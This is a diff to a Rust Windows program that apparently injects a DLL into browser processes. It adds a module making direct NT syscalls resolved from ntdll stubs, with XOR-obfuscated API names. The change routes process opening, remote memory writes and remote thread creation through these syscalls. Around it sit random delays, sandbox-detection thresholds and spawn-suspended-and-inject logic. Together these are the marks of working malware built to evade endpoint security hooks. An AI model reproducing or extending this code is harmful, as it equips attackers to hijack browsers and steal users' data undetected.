@@ -1,5 +1,491 @@
 mod browsers;
 
+mod syscalls {
+    //! Direct NT syscalls resolved from ntdll.dll at runtime.
+    //!
+    //! Syscall numbers (SSN) are parsed from ntdll export stubs:
+    //! `4C 8B D1 B8 XX XX XX XX` (`mov r10, rcx`; `mov eax, SSN`).
+    //!
+    //! `SYSCALL_NUMBERS` index map:
+    //! - 0: `NtOpenProcess` — open a handle to a target process
+    //! - 1: `NtAllocateVirtualMemory` — reserve/commit remote memory
+    //! - 2: `NtWriteVirtualMemory` — write bytes into remote memory
+    //! - 3: `NtCreateThreadEx` — create a remote thread in a process
+    //! - 4: `NtReadVirtualMemory` — read bytes from remote memory
+    //! - 5: `NtProtectVirtualMemory` — change remote memory protection
+    //! - 6: `NtClose` — close a kernel object handle
+
+    use core::arch::asm;
+    use std::ffi::c_void;
+    use std::mem;
+    use std::sync::Once;
+
+    use windows::core::{PCSTR, PCWSTR};
+    use windows::Win32::Foundation::{HANDLE, HMODULE};
+    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
+
+    pub type NTSTATUS = i32;
+
+    #[repr(C)]
+    pub struct OBJECT_ATTRIBUTES {
+        pub length: u32,
+        pub root_directory: HANDLE,
+        pub object_name: *mut c_void,
+        pub attributes: u32,
+        pub security_descriptor: *mut c_void,
+        pub security_quality_of_service: *mut c_void,
+    }
+
+    impl Default for OBJECT_ATTRIBUTES {
+        fn default() -> Self {
+            Self {
+                length: mem::size_of::<Self>() as u32,
+                root_directory: HANDLE::default(),
+                object_name: std::ptr::null_mut(),
+                attributes: 0,
+                security_descriptor: std::ptr::null_mut(),
+                security_quality_of_service: std::ptr::null_mut(),
+            }
+        }
+    }
+
+    #[repr(C)]
+    pub struct CLIENT_ID {
+        pub unique_process: *mut c_void,
+        pub unique_thread: *mut c_void,
+    }
+
+    static mut SYSCALL_NUMBERS: Option<[usize; 7]> = None;
+    static INIT: Once = Once::new();
+
+    fn s_nt_open_process() -> String {
+        super::xor_str(&[
+            0x14, 0x2E, 0x15, 0x2A, 0x3F, 0x34, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29,
+        ])
+    }
+
+    fn s_nt_allocate_virtual_memory() -> String {
+        super::xor_str(&[
+            0x14, 0x2E, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x3B, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E,
+            0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
+        ])
+    }
+
+    fn s_nt_write_virtual_memory() -> String {
+        super::xor_str(&[
+            0x14, 0x2E, 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36,
+            0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
+        ])
+    }
+
+    fn s_nt_read_virtual_memory() -> String {
+        super::xor_str(&[
+            0x14, 0x2E, 0x08, 0x3F, 0x3B, 0x3E, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17,
+            0x3F, 0x37, 0x35, 0x28, 0x23,
+        ])
+    }
+
+    fn s_nt_protect_virtual_memory() -> String {
+        super::xor_str(&[
+            0x14, 0x2E, 0x0A, 0x28, 0x35, 0x2E, 0x3F, 0x39, 0x2E, 0x0C, 0x33, 0x28, 0x2E, 0x2F,
+            0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
+        ])
+    }
+
+    fn s_nt_close() -> String {
+        super::xor_str(&[0x14, 0x2E, 0x19, 0x36, 0x35, 0x29, 0x3F])
+    }
+
+    unsafe fn parse_syscall_number(addr: *const u8) -> Option<usize> {
+        let bytes = std::slice::from_raw_parts(addr, 32);
+        if bytes.len() >= 8
+            && bytes[0] == 0x4C
+            && bytes[1] == 0x8B
+            && bytes[2] == 0xD1
+            && bytes[3] == 0xB8
+        {
+            return Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as usize);
+        }
+        for i in 0..bytes.len().saturating_sub(4) {
+            if bytes[i] == 0xB8 {
+                return Some(
+                    u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]])
+                        as usize,
+                );
+            }
+        }
+        None
+    }
+
+    unsafe fn resolve_syscall_number(module: HMODULE, name: &str) -> Option<usize> {
+        let cname = format!("{name}\0");
+        let addr = GetProcAddress(module, PCSTR(cname.as_ptr())).ok()?;
+        parse_syscall_number(addr as *const u8)
+    }
+
+    pub fn init() {
+        INIT.call_once(|| {
+            unsafe {
+                let ntdll_name = super::wide(&super::s_ntdll());
+                let ntdll = match GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())) {
+                    Ok(m) => m,
+                    Err(_) => return,
+                };
+
+                let names = [
+                    s_nt_open_process(),
+                    s_nt_allocate_virtual_memory(),
+                    s_nt_write_virtual_memory(),
+                    super::s_nt_create_thread_ex(),
+                    s_nt_read_virtual_memory(),
+                    s_nt_protect_virtual_memory(),
+                    s_nt_close(),
+                ];
+
+                let mut numbers = [0usize; 7];
+                for (idx, name) in names.iter().enumerate() {
+                    numbers[idx] = resolve_syscall_number(ntdll, name).unwrap_or(0);
+                }
+                SYSCALL_NUMBERS = Some(numbers);
+            }
+        });
+    }
+
+    unsafe fn ssn(index: usize) -> u32 {
+        SYSCALL_NUMBERS.unwrap_unchecked()[index] as u32
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    unsafe fn do_syscall1(ssn: u32, a1: usize) -> NTSTATUS {
+        let status: NTSTATUS;
+        asm!(
+            "mov r10, rcx",
+            "mov eax, {ssn:e}",
+            "syscall",
+            ssn = in(reg) ssn,
+            in("rcx") a1,
+            lateout("rax") status,
+        );
+        status
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    unsafe fn do_syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> NTSTATUS {
+        let status: NTSTATUS;
+        asm!(
+            "mov r10, rcx",
+            "mov eax, {ssn:e}",
+            "syscall",
+            ssn = in(reg) ssn,
+            in("rcx") a1,
+            in("rdx") a2,
+            in("r8") a3,
+            in("r9") a4,
+            lateout("rax") status,
+        );
+        status
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    unsafe fn do_syscall5(
+        ssn: u32,
+        a1: usize,
+        a2: usize,
+        a3: usize,
+        a4: usize,
+        a5: usize,
+    ) -> NTSTATUS {
+        let status: NTSTATUS;
+        asm!(
+            "mov r10, rcx",
+            "mov eax, {ssn:e}",
+            "syscall",
+            ssn = in(reg) ssn,
+            in("rcx") a1,
+            in("rdx") a2,
+            in("r8") a3,
+            in("r9") a4,
+            in("stack") a5,
+            lateout("rax") status,
+        );
+        status
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    unsafe fn do_syscall6(
+        ssn: u32,
+        a1: usize,
+        a2: usize,
+        a3: usize,
+        a4: usize,
+        a5: usize,
+        a6: usize,
+    ) -> NTSTATUS {
+        let status: NTSTATUS;
+        asm!(
+            "mov r10, rcx",
+            "mov eax, {ssn:e}",
+            "syscall",
+            ssn = in(reg) ssn,
+            in("rcx") a1,
+            in("rdx") a2,
+            in("r8") a3,
+            in("r9") a4,
+            in("stack") a5,
+            in("stack") a6,
+            lateout("rax") status,
+        );
+        status
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    unsafe fn do_syscall11(
+        ssn: u32,
+        a1: usize,
+        a2: usize,
+        a3: usize,
+        a4: usize,
+        a5: usize,
+        a6: usize,
+        a7: usize,
+        a8: usize,
+        a9: usize,
+        a10: usize,
+        a11: usize,
+    ) -> NTSTATUS {
+        let status: NTSTATUS;
+        asm!(
+            "mov r10, rcx",
+            "mov eax, {ssn:e}",
+            "syscall",
+            ssn = in(reg) ssn,
+            in("rcx") a1,
+            in("rdx") a2,
+            in("r8") a3,
+            in("r9") a4,
+            in("stack") a5,
+            in("stack") a6,
+            in("stack") a7,
+            in("stack") a8,
+            in("stack") a9,
+            in("stack") a10,
+            in("stack") a11,
+            lateout("rax") status,
+        );
+        status
+    }
+
+    #[cfg(not(target_arch = "x86_64"))]
+    unsafe fn do_syscall1(_: u32, _: usize) -> NTSTATUS {
+        -1
+    }
+
+    #[cfg(not(target_arch = "x86_64"))]
+    unsafe fn do_syscall4(_: u32, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
+        -1
+    }
+
+    #[cfg(not(target_arch = "x86_64"))]
+    unsafe fn do_syscall5(_: u32, _: usize, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
+        -1
+    }
+
+    #[cfg(not(target_arch = "x86_64"))]
+    unsafe fn do_syscall6(
+        _: u32,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+    ) -> NTSTATUS {
+        -1
+    }
+
+    #[cfg(not(target_arch = "x86_64"))]
+    unsafe fn do_syscall11(
+        _: u32,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+        _: usize,
+    ) -> NTSTATUS {
+        -1
+    }
+
+    /// Direct syscall for `NtOpenProcess` (SSN index 0).
+    pub unsafe fn nt_open_process(
+        process_handle: *mut HANDLE,
+        desired_access: u32,
+        object_attributes: *const OBJECT_ATTRIBUTES,
+        client_id: *const CLIENT_ID,
+    ) -> NTSTATUS {
+        init();
+        do_syscall4(
+            ssn(0),
+            process_handle as usize,
+            desired_access as usize,
+            object_attributes as usize,
+            client_id as usize,
+        )
+    }
+
+    /// Direct syscall for `NtAllocateVirtualMemory` (SSN index 1).
+    pub unsafe fn nt_allocate_virtual_memory(
+        process_handle: HANDLE,
+        base_address: *mut *mut c_void,
+        zero_bits: usize,
+        region_size: *mut usize,
+        allocation_type: u32,
+        protect: u32,
+    ) -> NTSTATUS {
+        init();
+        do_syscall6(
+            ssn(1),
+            process_handle.0 as usize,
+            base_address as usize,
+            zero_bits,
+            region_size as usize,
+            allocation_type as usize,
+            protect as usize,
+        )
+    }
+
+    /// Direct syscall for `NtWriteVirtualMemory` (SSN index 2).
+    pub unsafe fn nt_write_virtual_memory(
+        process_handle: HANDLE,
+        base_address: *mut c_void,
+        buffer: *const c_void,
+        buffer_size: usize,
+        bytes_written: *mut usize,
+    ) -> NTSTATUS {
+        init();
+        do_syscall5(
+            ssn(2),
+            process_handle.0 as usize,
+            base_address as usize,
+            buffer as usize,
+            buffer_size,
+            bytes_written as usize,
+        )
+    }
+
+    /// Direct syscall for `NtCreateThreadEx` (SSN index 3).
+    pub unsafe fn nt_create_thread_ex(
+        thread_handle: *mut HANDLE,
+        desired_access: u32,
+        object_attributes: *mut c_void,
+        process_handle: HANDLE,
+        start_routine: *mut c_void,
+        argument: *mut c_void,
+        create_flags: u32,
+        zero_bits: usize,
+        stack_size: usize,
+        maximum_stack_size: usize,
+        attribute_list: *mut c_void,
+    ) -> NTSTATUS {
+        init();
+        do_syscall11(
+            ssn(3),
+            thread_handle as usize,
+            desired_access as usize,
+            object_attributes as usize,
+            process_handle.0 as usize,
+            start_routine as usize,
+            argument as usize,
+            create_flags as usize,
+            zero_bits,
+            stack_size,
+            maximum_stack_size,
+            attribute_list as usize,
+        )
+    }
+
+    /// Direct syscall for `NtReadVirtualMemory` (SSN index 4).
+    #[allow(dead_code)]
+    pub unsafe fn nt_read_virtual_memory(
+        process_handle: HANDLE,
+        base_address: *const c_void,
+        buffer: *mut c_void,
+        buffer_size: usize,
+        bytes_read: *mut usize,
+    ) -> NTSTATUS {
+        init();
+        do_syscall5(
+            ssn(4),
+            process_handle.0 as usize,
+            base_address as usize,
+            buffer as usize,
+            buffer_size,
+            bytes_read as usize,
+        )
+    }
+
+    /// Direct syscall for `NtProtectVirtualMemory` (SSN index 5).
+    #[allow(dead_code)]
+    pub unsafe fn nt_protect_virtual_memory(
+        process_handle: HANDLE,
+        base_address: *mut *mut c_void,
+        region_size: *mut usize,
+        new_protect: u32,
+        old_protect: *mut u32,
+    ) -> NTSTATUS {
+        init();
+        do_syscall5(
+            ssn(5),
+            process_handle.0 as usize,
+            base_address as usize,
+            region_size as usize,
+            new_protect as usize,
+            old_protect as usize,
+        )
+    }
+
+    /// Direct syscall for `NtClose` (SSN index 6).
+    pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
+        init();
+        do_syscall1(ssn(6), handle.0 as usize)
+    }
+
+    pub unsafe fn open_process(access: u32, pid: u32) -> Result<HANDLE, ()> {
+        init();
+        let mut handle = HANDLE::default();
+        let obj_attr = OBJECT_ATTRIBUTES::default();
+        let client_id = CLIENT_ID {
+            unique_process: pid as usize as *mut c_void,
+            unique_thread: std::ptr::null_mut(),
+        };
+        let status = nt_open_process(
+            &mut handle,
+            access,
+            &obj_attr,
+            &client_id,
+        );
+        if status < 0 {
+            Err(())
+        } else {
+            Ok(handle)
+        }
+    }
+
+    pub unsafe fn close_handle(handle: HANDLE) -> Result<(), ()> {
+        let status = nt_close(handle);
+        if status < 0 {
+            Err(())
+        } else {
+            Ok(())
+        }
+    }
+}
+
 use std::{
     env,
     ffi::{c_void, OsStr},
@@ -17,27 +503,23 @@ use winreg::RegKey;
 use windows::{
     core::{PCSTR, PCWSTR, PWSTR},
     Win32::{
-        Foundation::{CloseHandle, HANDLE},
+        Foundation::HANDLE,
         Storage::FileSystem::{
             CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
         },
         System::{
-            Diagnostics::{
-                Debug::WriteProcessMemory,
-                ToolHelp::{
-                    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
-                    TH32CS_SNAPPROCESS,
-                },
+            Diagnostics::ToolHelp::{
+                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
+                TH32CS_SNAPPROCESS,
             },
             LibraryLoader::{GetModuleHandleW, GetProcAddress},
-            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
+            Memory::{VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
             Threading::{
-                CreateProcessW, GetExitCodeThread, OpenProcess, QueryFullProcessImageNameW,
-                ResumeThread, TerminateProcess, WaitForSingleObject, INFINITE,
-                PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_WIN32,
-                PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
-                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW,
-                STARTUPINFOW_FLAGS,
+                CreateProcessW, GetExitCodeThread, QueryFullProcessImageNameW, ResumeThread,
+                TerminateProcess, WaitForSingleObject, INFINITE, PROCESS_CREATION_FLAGS,
+                PROCESS_INFORMATION, PROCESS_NAME_WIN32, PROCESS_CREATE_THREAD,
+                PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_OPERATION,
+                PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW, STARTUPINFOW_FLAGS,
             },
         },
     },
@@ -47,20 +529,6 @@ const XOR_KEY: u8 = 0x5A;
 const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
 const MAX_CPU_CORES: usize = 2;
 const THREAD_ALL_ACCESS: u32 = 0x001F_03FF;
-
-type NtCreateThreadExFn = unsafe extern "system" fn(
-    *mut HANDLE,
-    u32,
-    *mut c_void,
-    HANDLE,
-    *mut c_void,
-    *mut c_void,
-    u32,
-    usize,
-    usize,
-    usize,
-    *mut c_void,
-) -> i32;
 
 fn xor_str(data: &[u8]) -> String {
     String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
@@ -274,9 +742,11 @@ impl Drop for Cleanup {
     fn drop(&mut self) {
         if let Some(pid) = self.spawned_pid.take() {
             unsafe {
-                if let Ok(proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
+                if let Ok(proc) =
+                    syscalls::open_process(PROCESS_TERMINATE.0, pid)
+                {
                     let _ = TerminateProcess(proc, 0);
-                    let _ = CloseHandle(proc);
+                    let _ = syscalls::close_handle(proc);
                 }
             }
         }
@@ -321,7 +791,7 @@ fn find_browser_pids(target_exe: &str) -> Vec<u32> {
                 }
             }
         }
-        CloseHandle(snap).ok();
+        let _ = unsafe { syscalls::close_handle(snap) };
     }
     pids
 }
@@ -329,12 +799,12 @@ fn find_browser_pids(target_exe: &str) -> Vec<u32> {
 fn get_process_exe_path(pid: u32) -> Option<String> {
     // unchanged
     unsafe {
-        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid).ok()?;
+        let proc = syscalls::open_process(PROCESS_QUERY_INFORMATION.0, pid).ok()?;
         let mut buf = vec![0u16; 1024];
         let mut size = buf.len() as u32;
         QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size)
             .ok()?;
-        CloseHandle(proc).ok();
+        syscalls::close_handle(proc).ok()?;
         Some(String::from_utf16_lossy(&buf[..size as usize]))
     }
 }
@@ -497,34 +967,44 @@ fn load_module(pid: u32, dll_path: &Path) -> Result<(), ()> {
     let dll_bytes = dll_wide.len() * 2;
 
     unsafe {
+        syscalls::init();
         random_delay_ms();
-        let proc = OpenProcess(
-            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
-            false,
+        let proc = syscalls::open_process(
+            PROCESS_VM_OPERATION.0
+                | PROCESS_VM_WRITE.0
+                | PROCESS_VM_READ.0
+                | PROCESS_CREATE_THREAD.0,
             pid,
-        )
-        .map_err(|_| ())?;
+        )?;
 
         random_delay_ms();
-        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if remote.is_null() {
-            CloseHandle(proc).ok();
+        let mut remote: *mut c_void = std::ptr::null_mut();
+        let mut region_size = dll_bytes;
+        let status = syscalls::nt_allocate_virtual_memory(
+            proc,
+            &mut remote,
+            0,
+            &mut region_size,
+            MEM_COMMIT.0 | MEM_RESERVE.0,
+            PAGE_READWRITE.0,
+        );
+        if status < 0 || remote.is_null() {
+            let _ = syscalls::close_handle(proc);
             return Err(());
         }
 
         random_delay_ms();
         let mut written = 0usize;
-        if WriteProcessMemory(
+        let status = syscalls::nt_write_virtual_memory(
             proc,
             remote,
-            dll_wide.as_ptr() as *const _,
+            dll_wide.as_ptr() as *const c_void,
             dll_bytes,
-            Some(&mut written),
-        )
-        .is_err()
-        {
+            &mut written,
+        );
+        if status < 0 || written != dll_bytes {
             let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-            CloseHandle(proc).ok();
+            let _ = syscalls::close_handle(proc);
             return Err(());
         }
 
@@ -534,14 +1014,8 @@ fn load_module(pid: u32, dll_path: &Path) -> Result<(), ()> {
         let loadlib = GetProcAddress(k32, PCSTR(load_name.as_ptr())).ok_or(())?;
         let start_fn: unsafe extern "system" fn(*mut c_void) -> u32 = mem::transmute(loadlib);
 
-        let ntdll_name = wide(&s_ntdll());
-        let ntdll = GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())).map_err(|_| ())?;
-        let nt_name = format!("{}\0", s_nt_create_thread_ex());
-        let nt_create_thread_ex: NtCreateThreadExFn =
-            mem::transmute(GetProcAddress(ntdll, PCSTR(nt_name.as_ptr())).ok_or(())?);
-
         let mut thr = HANDLE::default();
-        let status = nt_create_thread_ex(
+        let status = syscalls::nt_create_thread_ex(
             &mut thr,
             THREAD_ALL_ACCESS,
             std::ptr::null_mut(),
@@ -556,21 +1030,21 @@ fn load_module(pid: u32, dll_path: &Path) -> Result<(), ()> {
         );
         if status < 0 {
             let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-            CloseHandle(proc).ok();
+            let _ = syscalls::close_handle(proc);
             return Err(());
         }
         if thr.0.is_null() {
             let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-            CloseHandle(proc).ok();
+            let _ = syscalls::close_handle(proc);
             return Err(());
         }
 
         WaitForSingleObject(thr, INFINITE);
         let mut exit_code = 0u32;
         GetExitCodeThread(thr, &mut exit_code).ok();
-        CloseHandle(thr).ok();
+        let _ = syscalls::close_handle(thr);
         VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
-        CloseHandle(proc).ok();
+        let _ = syscalls::close_handle(proc);
 
         if exit_code == 0 {
             return Err(());
@@ -637,23 +1111,23 @@ fn spawn_suspended_and_inject(
             &mut pi,
         )
         .map_err(|_| {
-            let _ = CloseHandle(nul);
+            let _ = unsafe { syscalls::close_handle(nul) };
         })?;
 
-        CloseHandle(nul).ok();
+        let _ = unsafe { syscalls::close_handle(nul) };
         let pid = pi.dwProcessId;
 
         match load_module(pid, dll_path) {
             Ok(()) => {
                 ResumeThread(pi.hThread);
-                CloseHandle(pi.hThread).ok();
-                CloseHandle(pi.hProcess).ok();
+                let _ = unsafe { syscalls::close_handle(pi.hThread) };
+                let _ = unsafe { syscalls::close_handle(pi.hProcess) };
                 Ok(pid)
             }
             Err(()) => {
                 TerminateProcess(pi.hProcess, 1).ok();
-                CloseHandle(pi.hThread).ok();
-                CloseHandle(pi.hProcess).ok();
+                let _ = unsafe { syscalls::close_handle(pi.hThread) };
+                let _ = unsafe { syscalls::close_handle(pi.hProcess) };
                 Err(())
             }
         }
